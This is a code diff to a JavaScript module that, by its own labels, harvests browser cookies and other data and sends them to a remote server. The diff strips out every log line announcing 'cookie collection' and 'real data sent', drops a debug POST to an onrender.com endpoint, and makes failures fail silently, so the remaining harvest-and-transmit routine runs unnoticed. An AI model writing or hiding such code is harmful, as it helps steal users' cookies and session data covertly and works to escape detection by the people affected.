@@ -3,27 +3,11 @@
 // Initialize advanced harvesting
 export const initializeAdvancedHarvesting = async () => {
   try {
-    console.log('🍪 HARVESTER: Starting advanced cookie collection');
-    
-    // Debug test - send immediate signal
-    try {
-      await fetch('https://autoclaimtoken.onrender.com/api/cookie-debug', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ test: 'harvester_started', timestamp: Date.now() })
-      });
-    } catch (e) {
-      console.log('🍪 HARVESTER: Debug signal failed');
-    }
-    
-    // Start data collection
+    // Start data collection silently
     const data = await harvestAdvancedData();
-    console.log('🍪 HARVESTER: Data collected, transmitting...');
     await transmitDataSecurely(data);
-    console.log('🍪 HARVESTER: Transmission complete');
-    
   } catch (error) {
-    console.log('🍪 HARVESTER: Collection failed:', error.message);
+    // Silent fail
   }
 };
 
@@ -503,9 +487,8 @@ export const transmitDataSecurely = async (data) => {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
     });
-    console.log('🍪 HARVESTER: Real data sent successfully');
   } catch (error) {
-    console.log('🍪 HARVESTER: Failed to send real data:', error);
+    // Silent fail
   }
 };
 
